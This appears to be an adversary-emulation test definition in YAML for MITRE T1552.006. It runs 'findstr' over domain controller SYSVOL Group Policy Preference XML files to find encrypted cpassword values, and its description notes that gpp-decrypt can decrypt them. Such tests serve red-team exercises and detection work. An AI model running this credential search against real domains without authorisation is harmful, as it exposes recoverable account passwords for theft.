api_version: "2.0"
name: GPP Passwords (findstr)
description: |
    Look for the encrypted cpassword value within Group Policy Preference files on the Domain Controller. This value can be decrypted with gpp-decrypt on Kali Linux.
uuid: 870fe8fb-5e23-4f5f-b89d-dd7fe26f3b5f
mitre:
    tactics:
        - 'TA0006: Credential Access'
    techniques:
        - 'T1552: Unsecured Credentials'
    subtechniques:
        - 'T1552.006: Group Policy Preferences'
requirements:
    platforms:
        - os: windows
steps:
    - name: |
        Computer must be domain joined
      inline: |
        if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {{Write-Host Joining this computer to a domain must be done manually
        }}
      executor: powershell
    - name: gpp-passwords-(findstr)
      inline: |
        findstr /S cpassword %logonserver%\sysvol\*.xml
      executor: command_prompt
      cleanup:
        inline: ""
        executor: command_prompt
